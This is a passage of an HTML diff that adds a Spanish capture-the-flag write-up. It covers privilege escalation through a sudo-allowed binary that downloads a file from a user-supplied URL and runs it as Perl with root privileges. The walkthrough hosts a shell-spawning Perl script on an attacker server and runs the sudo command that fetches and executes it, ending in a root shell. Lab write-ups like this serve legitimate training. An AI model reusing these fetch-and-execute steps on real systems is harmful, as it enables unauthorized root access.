+                <pre><code class="language-c">iVar2 = strcmp(*(char **)(param_2 + 0x10), "lDnxUysaQn");
+if (iVar2 != 0) {
+    puts("Exiting... ");
+    exit(0);
+}</code></pre>
+                
+                <h3>Funcionalidad Principal: Descargar y Ejecutar</h3>
+                <p>Tras pasar todas las comprobaciones de validación, el binario:</p>
+                <ol>
+                    <li>Abre un archivo llamado <code>lDnxUysaQn</code> para escritura</li>
+                    <li>Usa curl para descargar contenido desde una URL proporcionada por el usuario (segundo argumento)</li>
+                    <li>Guarda el contenido descargado en el archivo</li>
+                    <li>Ejecuta el archivo como un script Perl con privilegios root</li>
+                    <li>Elimina el archivo después</li>
+                </ol>
+                
+                <p>El código descompilado relevante:</p>
+                
+                <pre><code class="language-c">puts("Running... ");
+__stream = fopen(*(char **)(param_2 + 0x10), "wb");
+uVar3 = curl_easy_init();
+curl_easy_setopt(uVar3, 0x2712, *(undefined8 *)(param_2 + 8));
+curl_easy_setopt(uVar3, 0x2711, __stream);
+curl_easy_setopt(uVar3, 0x2d, 1);
+iVar2 = curl_easy_perform(uVar3);
+
+if (iVar2 == 0) {
+    iVar2 = snprintf((char *)0x0, 0, "perl ./%s", __s);
+    __s_00 = (char *)malloc((long)iVar2 + 1);
+    snprintf(__s_00, (long)iVar2 + 1, "perl ./%s", __s);
+    fclose(__stream);
+    curl_easy_cleanup(uVar3);
+    setuid(0);
+    system(__s_00);
+    system("rm -f ./lDnxUysaQn");
+}</code></pre>
+                
+                <h2>Explotando el Binario para Acceso Root</h2>
+                <p>Entendiendo el comportamiento del binario, ahora puedo explotarlo para obtener acceso root. La estrategia de ataque es:</p>
+                <ol>
+                    <li>Crear un script Perl malicioso que genere una shell root</li>
+                    <li>Alojar el script en mi máquina atacante</li>
+                    <li>Ejecutar el binario con sudo, proporcionando la URL de mi servidor y la cadena de validación hardcodeada</li>
+                    <li>El binario descargará y ejecutará mi script Perl como root</li>
+                </ol>
+                
+                <h3>Creando el Script Perl Malicioso</h3>
+                <p>Creo un script Perl simple que ejecuta una shell:</p>
+                
+                <pre><code class="language-perl">exec "/bin/sh";</code></pre>
+                
+                <p>Lo guardo como <code>xd.pl</code> e inicio un servidor HTTP de Python para alojarlo:</p>
+                
+                <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+                
+                <h3>Ejecutando el Exploit</h3>
+                <p>En la máquina objetivo, ejecuto el binario con los argumentos correctos:</p>
+                
+                <pre><code class="language-bash">sudo /usr/bin/binary http://10.10.16.2:8000/xd.pl lDnxUysaQn</code></pre>
+                
+                <p>El binario muestra:</p>
+                <pre><code class="language-plaintext">Running...</code></pre>
+                
+                <p>Y recibo una shell root:</p>
+                <pre><code class="language-bash"># whoami
+root</code></pre>
+                
+                <p>Mi servidor HTTP de Python confirma la descarga:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.197 - - "GET /xd.pl HTTP/1.1" 200 -</code></pre>
+                
+                <p>Con acceso root, puedo recuperar la flag de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
